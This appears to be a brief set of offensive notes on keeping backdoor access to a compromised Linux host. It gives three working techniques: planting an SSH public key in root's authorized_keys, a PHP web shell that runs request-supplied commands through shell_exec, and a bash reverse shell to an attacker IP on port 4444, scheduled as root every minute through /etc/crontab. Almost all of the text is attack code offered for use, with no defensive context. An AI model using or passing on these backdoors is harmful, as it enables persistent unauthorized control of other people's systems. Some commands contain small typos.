# ssh backdoor

The ssh backdoor essentially consists of leaving our ssh keys in some userâ€™s home directory.

1. generate ssh-keygen
```
ssh-keygen
```
2. go to /root.ssh and leave our public key there with name `authorized_keys`

# php backdoor

```
<?php
    if (isset($_REQUEST['cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    }
?>
```

2. go to link http://[ip[/shell.php and execute command:

```
http://<ip>/shell.php?cmd=id
```

# cron job backdoor

1. create reverse_shell.sh
```
cat > reverse_shell.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/<your ip>/4444 0>&1
```
2. add reverse_shell.sh to execute every minute
```
echo "* * * * * root /path/to/reverse_shell.sh >> /etc/crontab
